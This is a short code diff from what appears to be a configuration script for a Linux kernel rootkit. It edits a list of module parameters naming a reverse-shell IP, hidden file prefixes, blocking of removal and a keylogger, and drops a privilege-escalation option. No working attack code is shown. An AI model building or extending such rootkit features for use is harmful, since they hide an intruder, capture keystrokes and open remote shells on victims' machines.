@@ -12,7 +12,7 @@ from subprocess import STDOUT, PIPE, CalledProcessError, check_output, Popen
 #######
 
 # These must be identical to the parameters declared in rootkit/rootkit.c
-MODULE_PARAMS = ["rev_shell_ip", "hidden_file_prefix", "escalate_privileges", "block_removal", "keylogger"]
+MODULE_PARAMS = ["rev_shell_ip", "hidden_file_prefix", "block_removal", "keylogger"]
 
 #######
 # Prompting/Printing
